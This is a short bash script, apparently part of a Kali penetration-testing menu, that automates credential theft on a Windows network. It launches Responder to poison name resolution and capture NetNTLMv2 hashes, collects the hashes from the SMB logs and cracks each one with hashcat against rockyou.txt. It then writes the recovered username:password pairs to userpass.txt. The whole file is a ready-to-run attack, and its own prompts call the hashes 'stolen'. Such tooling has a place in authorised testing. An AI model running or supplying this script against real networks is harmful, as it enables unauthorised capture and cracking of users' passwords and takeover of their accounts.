#!/bin/bash
echo "This script uses kali's rockyou.txt by default."
echo "Responder requires the user to press CTRL+C to close the script"
echo "Press CTRL+C after the desired number of password hashes are stolen to"
echo "continue with the process."
read -p "Press Enter to continue..."
clear
ifconfig
read -p "Enter the interface attached to the windows network: " interface
if [ ! -d Responder ] ; then mkdir Responder ; fi
if [ ! -f "/usr/share/wordlists/rockyou.txt" ] ; then zcat /usr/share/wordlists/rockyou.txt.gz > /usr/share/wordlists/rockyou.txt ; fi
responder -I $interface -rwFP
datetime=$(date +%F_%T)
mkdir Responder/$datetime
mkdir Responder/$datetime/logbackup
mv /usr/share/responder/logs/SMB* Responder/$datetime/logbackup/
for hash in $(cat Responder/$datetime/logbackup/SMB* | sort -u) ; do ((counter++)) ; echo "$hash" >> Responder/$datetime/$counter.txt ; done
for eachhash in $( ls Responder/$datetime/*.txt | tr " " "\n") ; do ((counter2++)) ; hashcat --force -m 5600 -o Responder/$datetime/hashcat$counter2 --outfile-format 3 $eachhash /usr/share/wordlists/rockyou.txt ; done
for crackedpass in $(ls Responder/$datetime/hashcat* | tr " " "\n") ; do  { awk -F: '{print $1}' $crackedpass; echo ":" ; awk -F: '{print $7}' $crackedpass; echo " "; } | tr -d "\n" | tr " " "\n" >> userpass.txt ; done

read -p "Press Enter to return to the main menu"
